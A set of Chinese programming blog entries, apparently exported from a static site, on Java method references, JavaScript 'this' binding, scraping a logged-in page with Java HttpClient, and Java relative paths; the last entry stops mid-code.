<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wbg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ImTheOne</span> </span>&#123;</span><br><span class="line">    <span class="function">TargetClass <span class="title">getTargetClass</span><span class="params">(String a)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TargetClass</span> </span>&#123;</span><br><span class="line">    String oneString;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TargetClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        oneString = <span class="string">&quot;default&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TargetClass</span><span class="params">(String a)</span> </span>&#123;</span><br><span class="line">        oneString = a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        ImTheOne imTheOne = TargetClass::<span class="keyword">new</span>;</span><br><span class="line">        TargetClass targetClass = imTheOne.getTargetClass(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        System.out.println(targetClass.oneString);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//相当于以下效果</span></span><br><span class="line">        ImTheOne imTheOne2 = (a) -&gt; <span class="keyword">new</span> TargetClass(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        TargetClass targetClass2 = imTheOne2.getTargetClass(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        System.out.println(targetClass2.oneString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>温馨提示（个人见解）：</strong>类构造器的用法感觉可读性真不高，所以本人是不建议使用的</p>
<h3 id="方法引用的总结"><a href="#方法引用的总结" class="headerlink" title="方法引用的总结"></a>方法引用的总结</h3><p>经过多方整合+个人理解琢磨，终于有一点小感悟了！</p>
<p><img src="https://i.loli.net/2021/11/29/PZO2C4UVWrSXGec.png" alt="img"></p>
<p>还是那句话，双冒号运算符，也叫方法引用，本质上就是字面上的意思：<strong>方法引用</strong>。</p>
<p>但是这里有一个过程（这个过程懂了就什么都懂了）：在使用方法引用的时候，就是将被引用的方法，重新还原成一个接口实现对象，这样就即可以直接被调用（对应前面三种的语法），又能用来实现接口中的唯一的抽象方法了（也就是类构造器的语法）。如此一来的话，就什么都说的通了</p>
<hr>
<h2 id="补充一个方法引用语法的用途"><a href="#补充一个方法引用语法的用途" class="headerlink" title="补充一个方法引用语法的用途"></a>补充一个方法引用语法的用途</h2><h3 id="数组引用"><a href="#数组引用" class="headerlink" title="数组引用"></a>数组引用</h3><p><strong>数组::new</strong></p>
<p>数组引用算是构造器引用的一种，可以引用一个数组的构造，举个例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ImTheOne</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function">T <span class="title">getArr</span><span class="params">(<span class="keyword">int</span> a)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ImTheOne&lt;<span class="keyword">int</span>[]&gt; imTheOne = <span class="keyword">int</span>[]::<span class="keyword">new</span>;</span><br><span class="line">        <span class="keyword">int</span>[] stringArr = imTheOne.getArr(<span class="number">5</span>);</span><br><span class="line">        System.out.println(stringArr.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原理和上面讲的一样，可以花点时间看下，加深一下对方法引用的理解。</p>
]]></content>
      <tags>
        <tag>lambda表达式</tag>
        <tag>java8新特性</tag>
        <tag>::双冒号</tag>
        <tag>方法引用</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript中的this指向</title>
    <url>/2022/02/22/javascript%E4%B8%AD%E7%9A%84this%E6%8C%87%E5%90%91/</url>
    <content><![CDATA[<h2 id="this指向的全部情况"><a href="#this指向的全部情况" class="headerlink" title="this指向的全部情况"></a>this指向的全部情况</h2><span id="more"></span>

<blockquote>
<p>概念：</p>
<p>函数所在当前作用域的对象：指函数被调用时所处的执行环境的对象。在JS中，执行环境是由函数被调用时的上下文决定的（特别地，如果一个对象有一个函数a，而这个函数a被赋值给了全局中的一个变量c，则c为一个独立的函数，故c所在的执行环境就是默认的全局（并非继承父函数的执行环境））<br>注：箭头函数不同于<code>funciton</code>方式定义函数，箭头函数嵌套在另一个函数中时，它将继承最近的非箭头父函数的<code>this</code></p>
</blockquote>
<p><strong>首先，明确一点：this的指向，只会在调用的时候才能确定</strong></p>
<h3 id="1）直接调用，指向全局（this不在函数中）"><a href="#1）直接调用，指向全局（this不在函数中）" class="headerlink" title="1）直接调用，指向全局（this不在函数中）"></a>1）直接调用，指向全局（this不在函数中）</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">this</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>打印结果</p>
</blockquote>
<p><img src="https://s2.loli.net/2022/02/22/bs475QkFzZehyDR.png" alt="image-20220222175707495"></p>
<h3 id="2）this在函数中"><a href="#2）this在函数中" class="headerlink" title="2）this在函数中"></a>2）this在函数中</h3><p><strong>this的指向，只会在调用的时候才能确定</strong></p>
<p>如果函数执行时，没有所属对象，this则指向全局windows{}</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">    b:<span class="number">1</span>,</span><br><span class="line">    c:<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//下面这个this，只有在执行的时候才能确定指向谁</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">this</span>)		<span class="comment">//在本程序中，该语句共被执行两次，一次有所属对象，一次没有所属对象</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>)</span>&#123;	<span class="comment">//第一种：该函数没有所属对象（该函数并不是一个属性）</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="built_in">this</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        d()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//第二种</span></span><br><span class="line">a.c();	<span class="comment">//通过a调用函数c（c是a的一个属性）；a就是c的所属对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//也是第一种情况</span></span><br><span class="line"><span class="keyword">let</span> e = a.c;	<span class="comment">//e就是一个单纯的函数</span></span><br><span class="line">e();	<span class="comment">//执行e()的时候，e没有所属对象</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>打印结果</p>
</blockquote>
<p><img src="https://s2.loli.net/2022/02/22/SEJk8Up7g6cebam.png" alt="image-20220222181208250"></p>
<h3 id="3-构造器中的-this：指向新对象"><a href="#3-构造器中的-this：指向新对象" class="headerlink" title="3) 构造器中的 this：指向新对象"></a>3) 构造器中的 this：指向新对象</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> b = a;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> a()	<span class="comment">//构造函数通过new调用创建一个实例对象,指向这个实例对象</span></span><br><span class="line"><span class="keyword">new</span> b(); <span class="comment">//构造函数通过new调用创建一个实例对象,指向这个实例对象</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>打印结果</p>
</blockquote>
<p><img src="https://s2.loli.net/2022/02/22/WySnC7XYR6Us1MF.png" alt="image-20220222181756834"></p>
<h3 id="4）apply、call能够改变this指向"><a href="#4）apply、call能够改变this指向" class="headerlink" title="4）apply、call能够改变this指向"></a>4）apply、call能够改变this指向</h3><p>无参数时或者传入null、undefined，指向window</p>
<p><strong>apply()、call()都是函数的方法：</strong></p>
<ul>
<li>若apply()、call()无参数时或者传入null、undefined,则指向windows</li>
<li>若apply()、call()有参数时，第一个参数就是apply()、call()函数的调用者函数的作用域</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a();</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> a()		<span class="comment">//使用new构造的时候，也会执行一遍函数</span></span><br><span class="line"></span><br><span class="line">a.apply(a)	<span class="comment">//改变了函数中的this指向，指向了传入的实参</span></span><br><span class="line">a.call(a)	<span class="comment">//改变了函数中的this指向，指向了传入的实参</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>打印结果</p>
</blockquote>
<p><img src="https://s2.loli.net/2022/02/22/PjtW9wlQVIKSDfJ.png" alt="image-20220222183132710"></p>
]]></content>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>java-使用HttpClient爬虫</title>
    <url>/2022/04/27/java-%E4%BD%BF%E7%94%A8HttpClient%E7%88%AC%E8%99%AB/</url>
    <content><![CDATA[<h2 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h2><span id="more"></span>

<p>使用的工具为Httpclient<br>主要分为两种：1、不需要登录就能访问的网页        2、需要登录才可以访问的网页</p>
<p>1、不需要登录的网页<br>    ①构建浏览器<br>    ②确定访问的uri<br>    ③获取到响应并解析</p>
<p>2、需要登录才可以访问的网页<br>    ①构建浏览器<br>    ②获取cookie（一般情况下只需要cookie，有的时候还需要其他的请求头，例如<code>authorization</code>请求头）<br>           第一种：静态获取：直接在浏览器中复制即可（有时候cookie没有用，换一个浏览器可能可以）<br>           第二种：模拟程序获取：如果不知道登录的请求uri和参数，可以先在浏览器中输入错误的账号、密码，得到用于登录的请求uri以及需要提交的表单的参数；<br>                                    然后在程序中想这个uri提交正确的表单，得到response，并得到Cookie<br>    ③按照浏览器中这个网址指定的请求方式，在程序中确定正式网页的请求uri和请求方式<br>    ④添加必要的几个请求头（例如Cookie、User-Agent等）<br>    ⑤获取到响应，并解析</p>
<p>完工！</p>
<h2 id="简单的HttpClient使用模板"><a href="#简单的HttpClient使用模板" class="headerlink" title="简单的HttpClient使用模板"></a>简单的HttpClient使用模板</h2><blockquote>
<p>如果是采用模拟程序获取Cookie的话，通常是显示用Post提交表单，获取到Cookie，然后在通过Get方式携带Cookie，爬取到想要的网页信息</p>
</blockquote>
<h3 id="Get方式请求"><a href="#Get方式请求" class="headerlink" title="Get方式请求"></a>Get方式请求</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 三步走：</span></span><br><span class="line"><span class="comment"> * ①创建CloseableHttpClient对象，作为客户端</span></span><br><span class="line"><span class="comment"> * ②创建HttpGet响应（先创建URIBuilder对象，再设置参数，参数设置结束后就创建HttpGet对象）</span></span><br><span class="line"><span class="comment"> * ③获取CloseableResponse响应</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * ④开始解析响应</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpGetParamTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ① 创建HttpClient对象</span></span><br><span class="line">        CloseableHttpClient httpClient = HttpClients.createDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置请求的地址是：http://yun.itheima.com/search?key=java</span></span><br><span class="line">        <span class="comment">// ②① 创建URIBuilder</span></span><br><span class="line">        URIBuilder uriBuilder = <span class="keyword">new</span> URIBuilder(<span class="string">&quot;https://mooc1.chaoxing.com/exam/test/reVersionPaperMarkContentNew?courseId=222650590&quot;</span> +</span><br><span class="line">                                               <span class="string">&quot;&amp;classId=50617144&amp;p=1&amp;id=57211393&amp;ut=s&amp;cpi=95361626&amp;newMooc=true&amp;openc=cfd40dfe5645b94bd7f0740626b30614&quot;</span>);</span><br><span class="line">        <span class="comment">// ②② 设置参数</span></span><br><span class="line">        <span class="comment">//uriBuilder.setParameter(&quot;courseId&quot;, &quot;222650590&quot;);//可以添加多个setParameter()</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ③ 创建HttpGet对象，设置URL访问地址</span></span><br><span class="line">        HttpGet httpGet = <span class="keyword">new</span> HttpGet(uriBuilder.build());</span><br><span class="line">        <span class="comment">// ④ 如果是需要登录的网页的内容，则需要添加Cookie头的信息（注意：有时候edge对应的Cookie没有用，比如这一次的就是用的ie浏览器中展示出来的Cookie值）</span></span><br><span class="line">        httpGet.addHeader(<span class="string">&quot;Cookie&quot;</span>, <span class="string">&quot;两种方式获取到的Cookie&quot;</span>);</span><br><span class="line"></span><br><span class="line">        httpGet.addHeader(<span class="string">&quot;User-Agent&quot;</span>, <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100&quot;</span> +</span><br><span class="line">                          <span class="string">&quot;.0.4896.127 Safari/537.36 Edg/100.0.1185.50&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ⑤ 使用HttpClient发起请求，获取response</span></span><br><span class="line">        CloseableHttpResponse response = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            response = httpClient.execute(httpGet);</span><br><span class="line">            <span class="comment">//解析响应</span></span><br><span class="line">            <span class="keyword">if</span> (response.getStatusLine().getStatusCode() == <span class="number">200</span>) &#123;</span><br><span class="line">                String content = EntityUtils.toString(response.getEntity(), <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">                System.out.println(content);</span><br><span class="line">                System.out.println(WriteToFile.write(content));</span><br><span class="line">                <span class="comment">//                System.out.println(content.length());</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//关闭Response</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                response.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//关闭HttpClient</span></span><br><span class="line">                httpClient.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Post方式请求"><a href="#Post方式请求" class="headerlink" title="Post方式请求"></a>Post方式请求</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 带参数的POST请求，四步走：</span></span><br><span class="line"><span class="comment"> * ①创建CloseableHttpClient客户端</span></span><br><span class="line"><span class="comment"> * ②创建HttpPost对象（声明一个List集合——&gt;存放参数NameValuePair类型——&gt;使用该List集合创建表单实体UrlEncodedFormEntity对象——&gt;设置表单的Entity对象到Post</span></span><br><span class="line"><span class="comment"> * 请求当中——&gt;构建出HttpPost对象）</span></span><br><span class="line"><span class="comment"> * ③获取CloseableHttpResponse响应</span></span><br><span class="line"><span class="comment"> * ④解析响应，获取content（String类型）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpPostParamTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> UnsupportedEncodingException </span>&#123;</span><br><span class="line">        <span class="comment">//创建HttpClient对象</span></span><br><span class="line">        CloseableHttpClient httpClient = HttpClients.createDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建HttpPost对象，设置URL访问地址</span></span><br><span class="line">        HttpPost httpPost = <span class="keyword">new</span> HttpPost(<span class="string">&quot;https://mooc1.chaoxing.com/exam/test/reVersionPaperMarkContentNew&quot;</span>);</span><br><span class="line">        <span class="comment">//声明List集合，封装表单中的参数</span></span><br><span class="line">        List&lt;NameValuePair&gt; params = <span class="keyword">new</span> ArrayList&lt;NameValuePair&gt;();        <span class="comment">//post发送构造函数只接受List&lt;? extends</span></span><br><span class="line">        <span class="comment">// NameValuePair&gt;为参数，所以不能使用map</span></span><br><span class="line">        params.add(<span class="keyword">new</span> BasicNameValuePair(<span class="string">&quot;courseId&quot;</span>, <span class="string">&quot;222650590&quot;</span>));</span><br><span class="line">        params.add(<span class="keyword">new</span> BasicNameValuePair(<span class="string">&quot;cpi&quot;</span>, <span class="string">&quot;95361626&quot;</span>));</span><br><span class="line">        params.add(<span class="keyword">new</span> BasicNameValuePair(<span class="string">&quot;newMooc&quot;</span>, <span class="string">&quot;true&quot;</span>));</span><br><span class="line">        params.add(<span class="keyword">new</span> BasicNameValuePair(<span class="string">&quot;openc&quot;</span>, <span class="string">&quot;cfd40dfe5645b94bd7f0740626b30614&quot;</span>));</span><br><span class="line">        <span class="comment">//创建表单的Entity对象，第一个参数是表单，第二个参数是编码</span></span><br><span class="line">        UrlEncodedFormEntity formEntity = <span class="keyword">new</span> UrlEncodedFormEntity(params, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="comment">//设置表单的Entity的对象到Post请求中</span></span><br><span class="line">        httpPost.setEntity(formEntity);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用HttpClient发起请求，获取response</span></span><br><span class="line">        CloseableHttpResponse response = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            response = httpClient.execute(httpPost);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//解析响应</span></span><br><span class="line">            <span class="keyword">if</span> (response.getStatusLine().getStatusCode() == <span class="number">200</span>) &#123;      <span class="comment">//状态码200表示请求成功</span></span><br><span class="line">                String content = EntityUtils.toString(response.getEntity(), <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;========================响应数据长度：&quot;</span> + content.length());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//关闭Response</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                response.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//关闭httpClient</span></span><br><span class="line">                httpClient.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>爬虫</tag>
        <tag>HttpClient</tag>
      </tags>
  </entry>
  <entry>
    <title>java中的相对路径用法</title>
    <url>/2021/09/07/java%E4%B8%AD%E7%9A%84%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<h2 id="一、不借助类的直接相对路径（一般不用）"><a href="#一、不借助类的直接相对路径（一般不用）" class="headerlink" title="一、不借助类的直接相对路径（一般不用）"></a>一、不借助类的直接相对路径（一般不用）</h2><span id="more"></span>

<p>下面两行的效果一样</p>
<p><img src="https://i.loli.net/2021/09/17/28CkdVmxBhgWSMT.png" alt="image-20210917221912780"></p>
<p>上面一行就是相对于当前工程目录（此种方法一般不用，因为，发布的时候src目录就不存在了）</p>
<p>下面一行是绝对路径</p>
<h2 id="二、借助类的获取相对路径（看编译后的文件路径）"><a href="#二、借助类的获取相对路径（看编译后的文件路径）" class="headerlink" title="二、借助类的获取相对路径（看编译后的文件路径）"></a>二、借助类的获取相对路径（看编译后的文件路径）</h2><p>*<em>此时，不可以采用上面的src/*<em>路径,因为编译后src目录不存在</em></em></p>
<p><strong>使用斜杠</strong>表示项目的根目录</p>
<p>下面出现了两种使用方法：</p>
<ol>
<li>一种是使用<strong>“/”</strong>，<strong>推荐使用这种</strong></li>
<li>另一种是使用<strong>“./”</strong>，这种方法<strong>不推荐</strong>，（因为有时候这种方法会不允许）</li>
</ol>
<p><strong>下面两张图分别是允许使用“./”，和不允许使用”./“的情况，但是都允许使用”/“</strong></p>
<p><img src="https://i.loli.net/2021/09/17/KcFpARZe9qDJ3d7.png" alt="image-20210917220901850"></p>
<p><img src="https://i.loli.net/2021/09/17/Dluy2erTdZN1mpE.png" alt="image-20210917221601506"></p>
<h2 id="三、小结"><a href="#三、小结" class="headerlink" title="三、小结"></a>三、小结</h2><p>上述两种使用方法基本上可以满足平常使用需要</p>
<h3 id="留有问题"><a href="#留有问题" class="headerlink" title="留有问题"></a>留有问题</h3><p>但是，还会有一些其他情况，由于没有摸索清楚，所以没有写上去。比如有时候，第二种方法中的”/”也可以直接去掉，有时候却不行；有时候第二种方法中的“./”可以使用，“../”也可以使用，但有时候却不行。</p>
<h3 id="若有高手，敬请指教，等待帮忙更新Thanks♪-･ω･-ﾉ"><a href="#若有高手，敬请指教，等待帮忙更新Thanks♪-･ω･-ﾉ" class="headerlink" title="若有高手，敬请指教，等待帮忙更新Thanks♪(･ω･)ﾉ"></a>若有高手，敬请指教，等待帮忙更新Thanks♪(･ω･)ﾉ</h3><p><img src="https://i.loli.net/2021/09/17/K26cZI9sLu38lbP.jpg" alt="img"></p>
<hr>
<hr>
<hr>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>几周过去了，又遇到了相对路径的问题，回头重新看了博客，感觉之前的理解还不够好，又重新整理了一下。</p>
<p><strong>首先，将路径问题重新进行分类：①相对的是计算机的盘符根目录（如“D:”）②相对当前项目的根目录③相对classpath路径④Properties获取资源文件⑤绝对路径</strong></p>
<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p><img src="https://i.loli.net/2021/11/23/5GlJzQ4WYLSAna8.png" alt="image-20211123124724761"></p>
<h3 id="相对的是计算机的盘符根目录（如“D-”）"><a href="#相对的是计算机的盘符根目录（如“D-”）" class="headerlink" title="相对的是计算机的盘符根目录（如“D:”）"></a>相对的是计算机的盘符根目录（如“D:”）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">File file2 = <span class="keyword">new</span> File(<span class="string">&quot;/text&quot;</span>);</span><br><span class="line">System.out.println(file2.getAbsolutePath());</span><br><span class="line">File file4 = <span class="keyword">new</span> File(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">System.out.println(file4.getAbsolutePath());</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/11/23/tksg8QYRSzeUZBC.png" alt="image-20211123125347487"></p>
<p>上述代码读取的就是从D盘，可见<strong>“/”和“/内容“</strong>代表的是盘符根目录</p>
<h3 id="相对当前项目的根目录"><a href="#相对当前项目的根目录" class="headerlink" title="相对当前项目的根目录"></a>相对当前项目的根目录</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">File file1 = <span class="keyword">new</span> File(<span class="string">&quot;./text&quot;</span>);</span><br><span class="line">System.out.println(file1.getAbsolutePath());</span><br><span class="line">File file4 = <span class="keyword">new</span> File(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">System.out.println(file4.getAbsolutePath());</span><br><span class="line">File file5 = <span class="keyword">new</span> File(<span class="string">&quot;&quot;</span>);</span><br><span class="line">System.out.println(file5.getAbsolutePath());</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/11/23/UPk4sTMH5Xpnr7y.png" alt="image-20211123125328298"></p>
<p>上述代码读取的位置是相对<strong>项目的根目录位置</strong></p>
<h3 id="相对classpath路径"><a href="#相对classpath路径" class="headerlink" title="相对classpath路径"></a>相对classpath路径</h3><h4 id="什么是classpath路径？"><a href="#什么是classpath路径？" class="headerlink" title="什么是classpath路径？"></a>什么是classpath路径？</h4><p>什么是classpath路径？或者说classpath路径指向的是哪里呢？</p>
<p>回答：最终下图中的<strong>src源文件夹、resource资源文件夹****中的内容都会被打包到输出文件夹</strong>tearget/classes文件夹下（java和resource就不在了）**</p>
<p><img src="https://i.loli.net/2021/11/23/yITupBcF2NOhgfU.png" alt="image-20211123124938384"></p>
<h4 id="有哪些获取classpath路径的方法呢？"><a href="#有哪些获取classpath路径的方法呢？" class="headerlink" title="有哪些获取classpath路径的方法呢？"></a>有哪些获取classpath路径的方法呢？</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(file3.getAbsolutePath()); 	<span class="comment">// 在下面截图中，未展示该结果</span></span><br><span class="line">System.out.println(Test2.class.getResource(<span class="string">&quot;&quot;</span>));	<span class="comment">// 在下面截图中，从该条命令开始打印</span></span><br><span class="line">System.out.println(Test2.class.getResource(<span class="string">&quot;/&quot;</span>));</span><br><span class="line">System.out.println(Test2.class.getClassLoader().getResource(<span class="string">&quot;&quot;</span>));</span><br><span class="line">System.out.println(ClassLoader.getSystemResource(<span class="string">&quot;&quot;</span>));</span><br><span class="line">System.out.println(Thread.currentThread().getContextClassLoader().getResource(<span class="string">&quot;&quot;</span>));</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/11/23/mUNbspIXjnLdkQM.png" alt="image-20211123125500979"></p>
<h3 id="使用Properties获取资源文件"><a href="#使用Properties获取资源文件" class="headerlink" title="使用Properties获取资源文件"></a>使用Properties获取资源文件</h3><p>使用下面代码可以获取到<strong>resource资源文件下的资源文件</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">properties.getProperty(<span class="string">&quot;a&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="绝对路径"><a href="#绝对路径" class="headerlink" title="绝对路径"></a>绝对路径</h3><p>绝对路径就一句话：从盘符开始的URL路径</p>
<h2 id="第二次小结"><a href="#第二次小结" class="headerlink" title="第二次小结"></a>第二次小结</h2><p>经过两次的大学习、大整理，关于java的相对路径总的来说就三个方面（或者说是三个类型）：</p>
<ul>
<li><p>相对jdk所在盘符根目录</p>
</li>
<li><p>相对项目所在的根目录</p>
</li>
<li><p>相对classpath所在的路径（需要理解classpath路径指向的是哪里）</p>
</li>
<li><p>附加一个Properties获取资源文件的类</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>Java基础</tag>
        <tag>java相对路径</tag>
      </tags>
  </entry>
  <entry>
    <title>java中经常忘记的几个知识点</title>
    <url>/2021/08/19/java%E4%B8%AD%E7%BB%8F%E5%B8%B8%E5%BF%98%E8%AE%B0%E7%9A%84%E5%87%A0%E4%B8%AA%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    <content><![CDATA[<h2 id="忘记点1：匿名内部类的使用"><a href="#忘记点1：匿名内部类的使用" class="headerlink" title="忘记点1：匿名内部类的使用"></a>忘记点1：匿名内部类的使用</h2><span id="more"></span>

<h3 id="使用情境"><a href="#使用情境" class="headerlink" title="使用情境"></a>使用情境</h3><p>通常在<strong>实现接口</strong>、<strong>继承抽象父类</strong>的时候需要使用到匿名内部类</p>
<h4 id="实现接口："><a href="#实现接口：" class="headerlink" title="实现接口："></a>实现接口：</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Product</span></span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">double</span> <span class="title">getPrice</span><span class="params">()</span></span>;</span><br><span class="line"> <span class="function"><span class="keyword">double</span> <span class="title">getName</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Anony</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(Product product)</span></span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;购买了一个&quot;</span>+product.getName()+<span class="string">&quot;，花掉了&quot;</span>+product.getPrice());</span><br><span class="line">	&#125;</span><br><span 